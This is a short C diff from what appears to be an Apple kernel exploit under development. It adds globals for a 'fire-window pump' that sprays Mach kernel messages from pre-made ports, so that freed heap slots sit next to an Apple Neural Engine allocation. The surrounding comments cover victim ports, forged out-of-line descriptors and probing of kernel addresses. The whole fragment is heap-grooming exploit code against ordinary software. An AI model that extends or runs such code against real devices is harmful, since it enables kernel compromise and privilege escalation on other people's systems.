@@ -322,6 +322,15 @@ static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
    {sid, flags 0xcx, tail 0x0000000100000001} on a desc reads
    type=0x0001 (OOL-forged) = the conversion door — probe the 64-bit
    address field fault-safely (mach_vm_read_overwrite via dlsym). */
+/* v17 fire-window pump globals (MUST precede p099_fire_pump): groom-time
+   kmsgs sit too far from the ANE's record-area allocation (framework allocs
+   intervene; MAF #11/#12 both rec0xc0/3072 with the reclaim running proved
+   the kept-8 free slots sit adjacent to the ANE's pop set). The pump sends
+   door kmsgs from PRE-MADE ports immediately before each prediction attempt
+   so the ANE's record-area element pops in the same magazine region. */
+#define P099_PUMP_PORTS 64u
+static mach_port_t g_p099_pumpPorts[P099_PUMP_PORTS];
+static uint32_t    g_p099_pumpSent;
 /* v17: fire-window pump — send `batch` door kmsgs on pre-made ports. */
 static void p099_fire_pump(uint32_t batch) {
     for (uint32_t k = 0; k < batch && g_p099_pumpSent < P099_PUMP_PORTS; k++) {
